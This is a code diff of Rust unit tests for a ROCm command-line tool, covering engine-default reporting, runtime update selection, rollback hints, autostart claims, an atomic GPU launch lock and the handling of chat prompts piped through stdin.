+        let (root, paths) = test_paths("examine-engine-inventory-unmatched-default");
+        let config = RocmCliConfig {
+            default_engine: Some("totally-unknown-plugin".to_owned()),
+            ..RocmCliConfig::default()
+        };
+        let mut output = String::new();
+
+        append_examine_engine_inventory(&mut output, &paths, &config, "vllm");
+        let _ = fs::remove_dir_all(root);
+
+        assert!(
+            !output.contains("legend:"),
+            "legend must be absent when the effective default matches no built-in engine; got:\n{output}"
+        );
+    }
+
     // ---------- engine shell prompt shim ----------
 
     #[test]
@@ -25691,6 +35447,14 @@ ID_LIKE="suse opensuse"
             output.contains("rocm config clear-default-engine"),
             "the note must name the remedy, not just the problem:\n{output}"
         );
+        assert!(
+            output.contains("  * lemonade "),
+            "the '*' marker must land on the configured engine, not the host's:\n{output}"
+        );
+        assert!(
+            !output.contains("  * vllm "),
+            "the host's preferred engine must not also be marked once overridden:\n{output}"
+        );
         let _ = fs::remove_dir_all(root);
     }
 
@@ -25708,6 +35472,36 @@ ID_LIKE="suse opensuse"
         assert!(
             !output.contains("configured_default_note"),
             "there is no override to report when the two agree:\n{output}"
+        );
+        let _ = fs::remove_dir_all(root);
+    }
+
+    #[test]
+    fn examine_treats_a_blank_configured_engine_as_unset() {
+        // Mirrors `select_serve_engine`'s guard: a config file with
+        // `default_engine = ""` must fall back to the host preference rather
+        // than reporting an empty engine name as "effective" and marking none
+        // of the real ones.
+        let (root, paths) = test_paths("examine-engine-inventory-blank-configured");
+        let config = RocmCliConfig {
+            default_engine: Some(String::new()),
+            ..RocmCliConfig::default()
+        };
+        let mut output = String::new();
+
+        append_examine_engine_inventory(&mut output, &paths, &config, "vllm");
+
+        assert!(
+            output.contains("configured_default_engine: <platform default>"),
+            "a blank configured value must read as unset:\n{output}"
+        );
+        assert!(
+            output.contains("effective_default_engine: vllm"),
+            "a blank configured value must fall back to the host default:\n{output}"
+        );
+        assert!(
+            output.contains("  * vllm "),
+            "the '*' marker must land on the host's default, not an empty name:\n{output}"
         );
         let _ = fs::remove_dir_all(root);
     }
@@ -25757,32 +35551,72 @@ ID_LIKE="suse opensuse"
     }
 
     #[test]
-    fn installed_update_runtime_matches_latest_version_and_family() {
-        let mut source = test_runtime_manifest_for_update(
-            "old-gfx120",
+    fn installed_update_runtime_is_selected_by_exact_target_key() {
+        // Everything a version match would have keyed on is identical here:
+        // same channel, format, family and version. Only the composition-keyed
+        // runtime key tells the freshly installed repair apart from the stale
+        // runtime it was installed to replace.
+        let stale = test_runtime_manifest_for_update(
+            "release-wheel-multi-arch-7-14-0",
             "therock-release:gfx120X-all",
             "gfx120X-all",
-            "7.13.0a20260416",
+            "7.14.0",
         );
-        source.channel = "release".to_owned();
         let wrong_family = test_runtime_manifest_for_update(
-            "new-gfx110",
+            "release-wheel-multi-arch-7-14-0-ffffffffffffffff",
             "therock-release:gfx110X-all",
             "gfx110X-all",
-            "7.14.0a20260531",
+            "7.14.0",
         );
-        let target = test_runtime_manifest_for_update(
-            "new-gfx120",
+        let repaired = test_runtime_manifest_for_update(
+            "release-wheel-multi-arch-7-14-0-0123456789abcdef",
             "therock-release:gfx120X-all",
             "gfx120X-all",
-            "7.14.0a20260531",
+            "7.14.0",
         );
-        let manifests = vec![wrong_family, target.clone()];
+        let manifests = vec![stale, wrong_family, repaired.clone()];
 
-        let selected = select_installed_update_runtime(&manifests, &source, "7.14.0a20260531")
-            .expect("matching updated runtime should be selected");
+        let selected = select_installed_update_runtime(&manifests, &repaired.runtime_key)
+            .expect("the side-by-side repair must be selected by its exact key");
+        assert_eq!(selected.runtime_key, repaired.runtime_key);
 
-        assert_eq!(selected.runtime_key, target.runtime_key);
+        assert!(
+            select_installed_update_runtime(&manifests, "release-wheel-multi-arch-7-15-0")
+                .is_none(),
+            "an install that wrote no manifest for the planned key must not resolve to a sibling"
+        );
+    }
+
+    #[test]
+    fn update_activate_summary_hints_rollback_only_when_a_previous_runtime_exists() {
+        let with_previous = RuntimeActivationResult {
+            runtime_id: "therock-release:gfx942".to_owned(),
+            runtime_key: "release-wheel-gfx942".to_owned(),
+            previous_runtime_key: Some("release-wheel-gfx942-old".to_owned()),
+        };
+        let mut rendered = String::new();
+        append_update_activate_summary(&mut rendered, &with_previous);
+        assert!(
+            rendered.contains("next step: if this causes problems, run `rocm runtimes rollback`"),
+            "a previous runtime is recorded, so rollback is a valid recovery path:\n{rendered}"
+        );
+        assert!(
+            rendered.contains("undoes only this one activation"),
+            "the hint should state the single-step limit up front, not just in --help:\n{rendered}"
+        );
+
+        let without_previous = RuntimeActivationResult {
+            runtime_id: "therock-release:gfx942".to_owned(),
+            runtime_key: "release-wheel-gfx942".to_owned(),
+            previous_runtime_key: None,
+        };
+        let mut rendered = String::new();
+        append_update_activate_summary(&mut rendered, &without_previous);
+        assert!(
+            !rendered.contains("rocm runtimes rollback"),
+            "no previous runtime is recorded, so `rocm runtimes rollback` would hard-error; \
+             must not hint at a command that immediately fails:\n{rendered}"
+        );
     }
 
     fn write_test_pip_runtime(
@@ -25831,6 +35665,7 @@ ID_LIKE="suse opensuse"
             version: version.to_owned(),
             install_root: install_root.clone(),
             selected_artifact_url: "https://example.invalid/therock".to_owned(),
+            source_layout_generation: None,
             index_url: Some("https://example.invalid/therock".to_owned()),
             tarball_file_name: None,
             python_launcher: Some("python".to_owned()),
@@ -25855,6 +35690,8 @@ ID_LIKE="suse opensuse"
                 ],
                 ..therock::RocmSdkPythonProbe::default()
             }),
+            sdk_torch: None,
+            wheel_composition: None,
             read_only: false,
             imported_from: None,
             installed_at_unix_ms,
@@ -25887,12 +35724,15 @@ ID_LIKE="suse opensuse"
             version: version.to_owned(),
             install_root: PathBuf::from("runtime-root"),
             selected_artifact_url: "https://example.invalid/therock".to_owned(),
+            source_layout_generation: None,
             index_url: Some("https://example.invalid/therock".to_owned()),
             tarball_file_name: None,
             python_launcher: Some("python".to_owned()),
             python_executable: Some("python".to_owned()),
             pip_cache_dir: None,
             rocm_sdk: None,
+            sdk_torch: None,
+            wheel_composition: None,
             read_only: false,
             imported_from: None,
             installed_at_unix_ms: 1,
@@ -26097,6 +35937,160 @@ ID_LIKE="suse opensuse"
         let _ = fs::remove_dir_all(&root);
     }
 
+    #[test]
+    fn autostart_spawn_in_flight_defers_only_for_a_live_recent_claim() {
+        let claim = AutostartClaim {
+            daemon_pid: 4242,
+            spawned_at_ms: 1_000,
+        };
+        // A recent claim whose PID is still alive ⇒ a spawn is in flight, defer.
+        assert!(autostart_spawn_in_flight(
+            Some(claim),
+            1_000 + 5_000,
+            AUTOSTART_CLAIM_TTL_MS,
+            |_| true,
+        ));
+        // Same claim but the child PID is gone (crashed spawn) ⇒ respawn.
+        assert!(!autostart_spawn_in_flight(
+            Some(claim),
+            1_000 + 5_000,
+            AUTOSTART_CLAIM_TTL_MS,
+            |_| false,
+        ));
+        // Older than the TTL, even with a live PID (possible PID reuse) ⇒ respawn.
+        assert!(!autostart_spawn_in_flight(
+            Some(claim),
+            1_000 + AUTOSTART_CLAIM_TTL_MS,
+            AUTOSTART_CLAIM_TTL_MS,
+            |_| true,
+        ));
+        // No claim at all ⇒ nothing in flight, spawn.
+        assert!(!autostart_spawn_in_flight(
+            None,
+            1_000,
+            AUTOSTART_CLAIM_TTL_MS,
+            |_| true,
+        ));
+    }
+
+    #[test]
+    fn autostart_claim_round_trips_and_absent_or_garbage_reads_as_none() {
+        let (root, paths) = test_paths("autostart-claim-roundtrip");
+        let path = paths.automation_autostart_claim_path();
+        fs::create_dir_all(path.parent().expect("claim parent")).expect("mkdir claim dir");
+        // Absent file ⇒ no claim.
+        assert_eq!(read_autostart_claim(&path), None);
+        // Round-trip a written claim.
+        let claim = AutostartClaim {
+            daemon_pid: 9987,
+            spawned_at_ms: 1_726_000_000_123,
+        };
+        write_autostart_claim(&path, claim).expect("write claim");
+        assert_eq!(read_autostart_claim(&path), Some(claim));
+        // Garbage / partial content ⇒ no claim (permits a respawn, never panics).
+        fs::write(&path, "not-a-pid").expect("write garbage");
+        assert_eq!(read_autostart_claim(&path), None);
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    /// Persist a live-looking managed record claiming `gpu` — the same shape a
+    /// real launch writes, with the current process id as the supervisor so the
+    /// liveness refresh in `load_managed_services` keeps it "starting" (and thus
+    /// counted by `busy_gpu_indices`).
+    fn write_claiming_record(paths: &AppPaths, service_id: &str, port: u16, gpu: &[u32]) {
+        let mut record = ManagedServiceRecord::new(
+            paths,
+            service_id,
+            "vllm",
+            "qwen",
+            "Qwen/Qwen3.5",
+            "127.0.0.1",
+            port,
+            "managed",
+            std::process::id(),
+            Some("therock-release".to_owned()),
+            None,
+            Some("gpu_required".to_owned()),
+        );
+        record.status = "starting".to_owned();
+        record.gpu_indices = gpu.to_vec();
+        record.write().expect("write claiming record");
+    }
+
+    #[test]
+    fn launch_lock_makes_gpu_select_and_claim_atomic() {
+        // Regression for the serve read-select-launch race: the busy-GPU read and
+        // the claiming record write must happen under one lock, or two concurrent
+        // `--gpu auto` serves both read the same GPU as free and land on it.
+        //
+        // The test does NOT take the lock itself — that would only prove
+        // `FileLock` excludes (already covered by
+        // `file_lock_serializes_concurrent_holders` in rocm-core). It calls
+        // `select_gpu_indices_under_launch_lock`, the production helper `serve()`
+        // uses, whose contract is that it returns the guard *it* acquired together
+        // with the selection; the test holds that guard across the claim exactly
+        // as `serve()` holds it until `spawn_managed_engine_child` persists the
+        // record. Delete the `FileLock::acquire` from that helper and this test
+        // goes red: both threads then select GPU 0.
+        //
+        // Determinism: the barrier releases both threads together and each sleeps
+        // between select and claim, so an unlocked helper double-books GPU 0
+        // regardless of scheduling skew, while the locked helper forces the second
+        // thread to observe the first thread's claim.
+        let (root, paths) = test_paths("launch-lock-atomic-claim");
+        paths.ensure().expect("prepare paths");
+        let detected = Some(2_usize);
+
+        let barrier = std::sync::Barrier::new(2);
+        let selections = std::thread::scope(|scope| {
+            let handles: Vec<_> = [("svc-race-a", 21001_u16), ("svc-race-b", 21002_u16)]
+                .into_iter()
+                .map(|(service_id, port)| {
+                    let paths = &paths;
+                    let barrier = &barrier;
+                    scope.spawn(move || {
+                        barrier.wait();
+                        // The exact call `serve()` makes: the helper acquires the
+                        // launch lock and selects under it, handing the guard back.
+                        // `None` visibility keeps selection mask-unaware for the
+                        // test host; `pinned` `None` + `cpu_only` false is the
+                        // `--gpu auto` path that reads live busy-GPU state.
+                        let (gpu, lock) = select_gpu_indices_under_launch_lock(
+                            paths,
+                            false,
+                            None,
+                            || detected,
+                            None,
+                            None,
+                        )
+                        .expect("auto GPU selection under launch lock");
+                        // Widen the select→claim window so an unlocked helper
+                        // deterministically double-books GPU 0; under the lock the
+                        // second thread cannot enter until we claim.
+                        std::thread::sleep(Duration::from_millis(50));
+                        write_claiming_record(paths, service_id, port, &gpu);
+                        drop(lock);
+                        gpu
+                    })
+                })
+                .collect();
+            handles
+                .into_iter()
+                .map(|handle| handle.join().expect("selection thread joins"))
+                .collect::<Vec<_>>()
+        });
+
+        let mut picked: Vec<u32> = selections.into_iter().flatten().collect();
+        picked.sort_unstable();
+        assert_eq!(
+            picked,
+            vec![0, 1],
+            "serialized select-then-claim must hand out distinct GPUs, got {picked:?}"
+        );
+
+        let _ = fs::remove_dir_all(&root);
+    }
+
     // ---- Phase 9: reroute dispatch (bare `rocm` + interactive `rocm chat`) ----
     //
     // The interactive branches require a real TTY (`interactive_terminal()`),
@@ -26206,7 +36200,7 @@ ID_LIKE="suse opensuse"
         // interactive target). Coercing to the fn pointer fails to compile if
         // the entrypoint is removed or its signature drifts; casting the pointer
         // to an address gives the binding a real effect (no underscore-bind).
-        let target: fn(bool) -> Result<()> = dash::run_chat;
+        let target: fn(bool, ChatInferenceParams) -> Result<()> = dash::run_chat;
         assert_ne!(target as usize, 0);
     }
 
@@ -26229,8 +36223,8 @@ ID_LIKE="suse opensuse"
         let src = main_rs_source();
         let body = strip_line_comments(&command_chat_handler_body(&src));
         assert!(
-            body.contains("dash::run_chat(chat_mock)"),
-            "interactive `rocm chat` must route to dash::run_chat(chat_mock); body:\n{body}"
+            body.contains("dash::run_chat("),
+            "interactive `rocm chat` must route to dash::run_chat(...); body:\n{body}"
         );
         assert!(
             !body.contains("tui::run"),
@@ -26266,8 +36260,15 @@ ID_LIKE="suse opensuse"
             "Command::Chat must destructure the --chat-mock field; body:\n{body}"
         );
         assert!(
-            body.contains("dash::run_chat(chat_mock)"),
-            "--chat-mock must drive run_chat(chat_mock); body:\n{body}"
+            body.contains("dash::run_chat(") && body.contains("chat_mock,"),
+            "--chat-mock must be forwarded to run_chat; body:\n{body}"
+        );
+        assert!(
+            body.contains("ChatInferenceParams")
+                && body.contains("temperature,")
+                && body.contains("top_p,")
+                && body.contains("max_tokens,"),
+            "sampling controls must be forwarded to interactive dash chat; body:\n{body}"
         );
         // The scriptable prompt passthrough stays on the text render path,
         // NOT the dash/TUI.
@@ -26279,5 +36280,90 @@ ID_LIKE="suse opensuse"
             body.contains("render_chat_text("),
             "non-interactive no-prompt path must still call render_chat_text; body:\n{body}"
         );
+    }
+
+    #[test]
+    fn command_chat_reads_prompt_from_piped_stdin() {
+        // A structural guard on the wiring, not a behavioral test: the handler
+        // reads the real fd 0, which an in-process test cannot pipe. The
+        // behavior — piped text reaching the model unaltered — is covered end
+        // to end by the `chat-09` scenario (`@id:chat-cli-stdin-prompt`); what
+        // is checked here is that the `--prompt`-less arm still resolves the
+        // prompt from `read_piped_prompt`, with the result feeding the dispatch
+        // rather than being discarded or read after the send decision is
+        // already made.
+        let src = main_rs_source();
+        let body = strip_line_comments(&command_chat_handler_body(&src));
+        assert!(
+            body.contains("read_piped_prompt("),
+            "no-prompt path must read piped stdin via read_piped_prompt; body:\n{body}"
+        );
+        assert!(
+            body.contains("None => read_piped_prompt()?"),
+            "the piped read must supply the prompt that is dispatched (and \
+             propagate its error), not be a discarded call; body:\n{body}"
+        );
+        let read_at = body.find("read_piped_prompt(").expect("asserted above");
+        let send_at = body
+            .find("render_chat_prompt_text(")
+            .unwrap_or_else(|| panic!("chat handler no longer sends a prompt; body:\n{body}"));
+        assert!(
+            read_at < send_at,
+            "stdin must be read before the send/status-screen decision, or a \
+             piped prompt cannot influence it; body:\n{body}"
+        );
+    }
+
+    #[test]
+    fn piped_prompt_keeps_everything_but_the_trailing_line_ending() {
+        // A piped prompt must reach the send path byte-identical to the same
+        // text passed with `--prompt`, which is forwarded verbatim. Only the
+        // line ending the writer appends is dropped; indentation and trailing
+        // spaces or tabs are content and have to survive.
+        assert_eq!(
+            piped_prompt_from_input("    indented line\n"),
+            Some("    indented line".to_owned()),
+            "leading indentation must survive; only the trailing newline goes"
+        );
+        assert_eq!(
+            piped_prompt_from_input("trailing spaces matter   \n"),
+            Some("trailing spaces matter   ".to_owned()),
+            "trailing spaces must survive the trailing-newline strip"
+        );
+        assert_eq!(
+            piped_prompt_from_input("\tleading tab"),
+            Some("\tleading tab".to_owned()),
+            "input without a trailing newline must pass through unchanged"
+        );
+        assert_eq!(
+            piped_prompt_from_input("crlf line\r\n"),
+            Some("crlf line".to_owned()),
+            "a Windows line ending must be stripped as one unit"
+        );
+        assert_eq!(
+            piped_prompt_from_input("fn main() {\n    body\n}\n"),
+            Some("fn main() {\n    body\n}".to_owned()),
+            "interior newlines and indentation must survive"
+        );
+        assert_eq!(
+            piped_prompt_from_input("blank line below\n\n"),
+            Some("blank line below\n".to_owned()),
+            "only one trailing line ending is shell punctuation; the rest is content"
+        );
+    }
+
+    #[test]
+    fn piped_prompt_treats_whitespace_only_input_as_no_prompt() {
+        // The fallback that keeps the no-argument behavior intact: an empty
+        // pipe, a bare newline, or blank padding carries no prompt, so the
+        // caller must see `None` and render the status screen instead of
+        // sending whitespace to a model.
+        for input in ["", "\n", "\r\n", "   ", "  \t \n\n", "\n\n\n"] {
+            assert_eq!(
+                piped_prompt_from_input(input),
+                None,
+                "whitespace-only stdin must yield no prompt; input: {input:?}"
+            );
+        }
     }
 }
